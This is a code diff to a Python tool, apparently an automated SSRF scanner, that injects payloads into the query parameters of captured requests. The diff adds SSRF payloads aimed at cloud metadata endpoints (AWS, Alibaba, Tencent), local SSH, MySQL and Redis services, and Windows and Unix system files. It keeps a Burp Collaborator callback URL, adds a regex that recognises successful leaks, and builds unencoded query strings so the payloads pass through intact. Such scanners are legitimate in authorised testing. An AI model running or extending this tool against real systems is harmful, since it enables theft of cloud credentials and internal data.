@@ -13,23 +13,44 @@ init(autoreset=True)
 # Configuration
 SSRF_PAYLOADS = [
     'file:///etc/passwd',
-    'file://\/\/etc/passwd',
-    'file://etc/passwd',
+#    'file://\/\/etc/passwd',
+#    'file://etc/passwd',
     'http://wmmxwwl7n8vhv62wptl0tq936uck09.oastify.com',
-    'file:/etc/passwd?/',
-    'file:/etc/passwd%3F/',
-    'file:/etc%252Fpasswd/',
-    'file:/etc%252Fpasswd%3F/',
-    'file:///etc/?/../passwd',
-    'file:///etc/%3F/../passwd',
-    'file:${br}/et${u}c/pas${te}swd?/',
-    'file:$(br)/et$(u)c/pas$(te)swd?/',
-    'file:${br}/et${u}c%252Fpas${te}swd?/',
-    'file:$(br)/et$(u)c%252Fpas$(te)swd?/',
-    'file:${br}/et${u}c%252Fpas${te}swd%3F/',
-    'file:$(br)/et$(u)c%252Fpas$(te)swd%3F/',
-    'file:///etc/passwd?/../passwd'
+#    'file:/etc/passwd?/',
+#    'file:/etc/passwd%3F/',
+#    'file:/etc%252Fpasswd/',
+#    'file:/etc%252Fpasswd%3F/',
+#    'file:///etc/?/../passwd',
+#    'file:///etc/%3F/../passwd',
+#    'file:${br}/et${u}c/pas${te}swd?/',
+#    'file:$(br)/et$(u)c/pas$(te)swd?/',
+#    'file:${br}/et${u}c%252Fpas${te}swd?/',
+#    'file:$(br)/et$(u)c%252Fpas$(te)swd?/',
+#    'file:${br}/et${u}c%252Fpas${te}swd%3F/',
+#    'file:$(br)/et$(u)c%252Fpas$(te)swd%3F/',
+#    'file:///etc/passwd?/../passwd',
+    'file:///c:/./windows/./win.ini',
+    'http://metadata.tencentyun.com/latest/meta-data/',
+    'http://100.100.100.200/latest/meta-data/',
+    'http://169.254.169.254/latest/meta-data/',
+    'http://169.254.169.254/metadata/v1',
+    'http://127.0.0.1:22',
+    'http://127.0.0.1:3306',
+    'dict://127.0.0.1:6379/info'
 ]
+
+pattern = re.compile(
+    r'[a-zA-Z_-]{1,}:x:[0-9]{1,}:[0-9]{1,}:'  # passwd file pattern
+    r'|<html>(<head></head>)?<body>[a-z0-9]+</body>'  # Basic HTML pattern for collaborator
+    r'|SSH-(\d\.\d)-OpenSSH_(\d\.\d)'  # SSH version pattern
+    r'|(DENIED Redis|CONFIG REWRITE|NOAUTH Authentication)'  # Redis errors
+    r'|(\d\.\d\.\d)(.*?)mysql_native_password'  # MySQL version pattern
+    r'|for 16-bit app support'  # Windows legacy support
+    r'|dns-conf\/[\s\S]+instance\/'  # DNS config
+    r'|app-id[\s\S]+placement\/'  # AWS App-ID
+    r'|ami-id[\s\S]+placement\/'  # AWS AMI-ID
+    r'|id[\s\S]+interfaces\/'  # AWS Network Interfaces
+)
 DEFAULT_TIMEOUT = 50
 
 # Concurrency limit for async tasks
@@ -63,7 +84,9 @@ async def inject_SSRF_payload(session, request, semaphore):
                 for payload in SSRF_PAYLOADS:
                     modified_params = query_params.copy()
                     modified_params[param] = [payload for value in values]
-                    new_query_string = urlencode(modified_params, doseq=True)
+                    new_query_string = "&".join(
+                        f"{param}={value}" for param, values in modified_params.items() for value in values
+                    )
                     new_url = urljoin(url, f"{parsed_url.path}?{new_query_string}")
 
                     result = await test_SSRF(session, new_url, method, headers=headers)
@@ -152,7 +175,7 @@ async def test_SSRF(session, url, method, headers=None, data=None):
         response = await session.request(method, url, headers=headers, data=data, timeout=DEFAULT_TIMEOUT)
 
         for payload in SSRF_PAYLOADS:
-            if re.search(r'[a-zA-Z_-]{1,}:x:[0-9]{1,}:[0-9]{1,}:|<html>(<head></head>)?<body>[a-z0-9]+</body>', response.text):  # Check for passwd file
+            if pattern.search(response.text):  # Check for ssrf
                 return {
                     "url": url,
                     "method": method,
